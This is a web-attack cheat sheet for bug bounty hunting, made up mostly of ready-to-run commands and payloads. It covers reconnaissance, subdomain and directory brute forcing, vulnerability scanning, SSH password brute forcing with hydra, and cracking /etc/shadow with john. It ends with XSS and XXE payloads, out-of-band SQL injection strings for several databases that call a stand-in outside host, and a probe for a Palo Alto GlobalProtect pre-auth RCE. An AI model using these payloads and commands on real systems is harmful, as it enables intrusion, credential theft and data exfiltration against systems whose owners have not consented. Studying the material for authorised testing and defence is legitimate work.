# Web-Attack-Cheat-Sheet


## Discovering

### Bug Bount Targets
	https://github.com/arkadiyt/bounty-targets-data

### IP Enumeration
	http://www.asnlookup.com/
	
### Subdomain Enumeration
	https://appsecco.com/books/subdomain-enumeration/
	
	https://github.com/OWASP/Amass
		amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com

	https://github.com/projectdiscovery/subfinder
		subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com
	
	https://github.com/nsonaniya2010/SubDomainizer
		python3 SubDomainizer.py -u example.com -o dir/example.com
	
	https://dns.bufferover.run/dns?q=example.com
	
	https://crt.sh/?q=%25example.com
	
	https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization
	
	https://www.shodan.io/search?query=ssl%3AExample
	
	https://securitytrails.com/list/email/dns-admin.example.com
		curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"apex_domain":"example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> subdomains.txt
		curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"whois_email":"domains@example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> domains.txt
	
	https://viewdns.info/reversewhois/
	
	https://opendata.rapid7.com/

### Wayback Machine
	https://github.com/tomnomnom/waybackurls
		cat subdomains.txt | waybackurls > waybackurls.txt
	https://github.com/tomnomnom/hacks
		cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt
	
### HTTPS or HTTP
	while read i; do curl -m 15 -ki http://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt
	while read i; do curl -m 15 -ki https://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt

### Cache
	https://www.giftofspeed.com/cache-checker/

### Crawling
	https://github.com/jaeles-project/gospider
		gospider -s "https://example.com/" -o output -c 20 -d 10

### Access target directly through IP address
	http://1.2.3.4
	https://1.2.3.4

### Wordlist
	https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
		Wordlist Extractor
	https://github.com/ameenmaali/wordlistgen
		cat hosts.txt | wordlistgen

### Directory Bruteforcing
	https://github.com/ffuf/ffuf
		ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'
		
	https://github.com/OJ/gobuster
		gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'

	https://github.com/tomnomnom/meg
		meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic

	https://github.com/deibit/cansina
		python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist
	
### DNS and HTTP detection
	https://ceye.io/
		curl http://api.ceye.io/v1/records?token={API Key}&type=dns
		curl http://api.ceye.io/v1/records?token={API Key}&type=http

	https://portswigger.net/burp/documentation/collaborator
		https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions
		
### Acquisitions/Names/Addresses/Contacts/Emails/etc.
	https://hunter.io

	https://github.com/khast3x/h8mail
		h8mail -t target@example.com
	
	https://dashboard.fullcontact.com
	
	https://www.peopledatalabs.com

### HTML/JavaScript Comments
	Burp Engagement Tools
	
### Google Dorks
	https://www.exploit-db.com/google-hacking-database

### Content Security Policy (CSP)
	https://csp-evaluator.withgoogle.com/

### Brute Force Tiny URLs Services
	https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research

### GraphQL
	https://github.com/doyensec/graph-ql
	https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/

### General
	https://github.com/redhuntlabs/Awesome-Asset-Discovery


## Enumerating

### Figerprint
	https://github.com/urbanadventurer/WhatWeb
		whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com

	https://builtwith.com

	https://www.wappalyzer.com

	https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
		Software Vulnerability Scanner Burp Extension

### List s3 bucket permissions and keys
	https://aws.amazon.com/cli/
		aws s3api get-bucket-acl --bucket examples3bucketname
		aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext
		aws s3api list-objects --bucket examples3bucketname
		aws s3api list-objects-v2 --bucket examples3bucketname
		aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext

### Enumerate permissions associated with cloud (e.g. AWS) credential
	https://github.com/andresriancho/enumerate-iam
	
	https://github.com/nccgroup/ScoutSuite

### Visual Identification
	https://github.com/FortyNorthSecurity/EyeWitness
		eyewitness --web --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains.txt" -d "${PWD}/eyewitness/"

	https://github.com/michenriksen/aquatone
		cat targets.txt | aquatone


## Scanning

### Burp Scanner
	https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner

### Send emails (SMTP)
	while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt
	References
		Ticket Trick https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
		Abusing autoresponders and email bounces https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2

### Search Vulnerabilities
	https://github.com/vulnersCom/getsploit
		getsploit wordpress 4.7.0
		
	https://www.exploit-db.com/searchsploit
		searchsploit -t oracle windows
		
### Web Scanning
	https://github.com/sullo/nikto
		nikto -ssl -host www.example.com

	https://github.com/wpscanteam/wpscan
		wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com
		
	https://github.com/droope/droopescan
		droopescan scan drupal -u example.com

### Subdomain Takeover
	https://github.com/anshumanbh/tko-subs
		tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt

	https://github.com/Ice3man543/SubOver
		SubOver -l subdomains.txt
	
### SQLi
	https://github.com/sqlmapproject/sqlmap
		sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch 
		sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch
	
### Repositories Scanning
	https://github.com/zricethezav/gitleaks
		gitleaks --github-org=organization --threads=4 -v --disk
		
	https://github.com/michenriksen/gitrob
	
	https://github.com/dxa4481/truffleHog
	
	https://github.com/awslabs/git-secrets
	
	https://github.com/eth0izzle/shhgit

### Google Dorks Scanning
	https://github.com/opsdisk/pagodo
		python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1

### CORS Misconfigurations
	https://github.com/s0md3v/Corsy
		python3 corsy.py -u https://example.com


## Attacking

### Brute Force
	https://github.com/vanhauser-thc/thc-hydra
		hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh

	https://www.openwall.com/john/
		unshadow /etc/passwd /etc/shadow > mypasswd.txt
		john mypasswd.txt


## Manual

### Payloads
	https://github.com/swisskyrepo/PayloadsAllTheThings
		PayloadsAllTheThings
  
	XSS
		{{constructor.constructor('alert()')()}} # AngularJS
		https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
		
	XXE
		<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">

### Reusing Cookies
	https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b

### SSRF
	https://lab.wallarm.com/blind-ssrf-exploitation/

### SQLi
	DNS Detection
		Oracle
			'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'
			'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'
			'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'
			'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'
			
		MySQL
			'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'
			
		Microsoft SQL Server
			'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'
			'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'
			'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'
			
		PostgreSQL
			'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'

### Fake Server
	# HTTP
		python -m SimpleHTTPServer 8080
    
	# HTTP and log request headers and send response
		dummy-web-server.py 80
    
	# HTTPS
		openssl req -new -x509 -keyout test.key -out test.crt -nodes
		cat test.key test.crt > test.pem
		socat openssl-listen:443,reuseaddr,cert=test.pem,verify=0,fork stdio
	
	# FTP
		python -m pyftpdlib --directory=/tmp/dir/ --port=21
    
### General useful commands
	# Trim space and newlines on bash variable
		"${i//[$'\t\r\n ']}"

### Check PreAuth RCE on Palo Alto GlobalProtect
	https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
		time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null
		time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null
		time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null
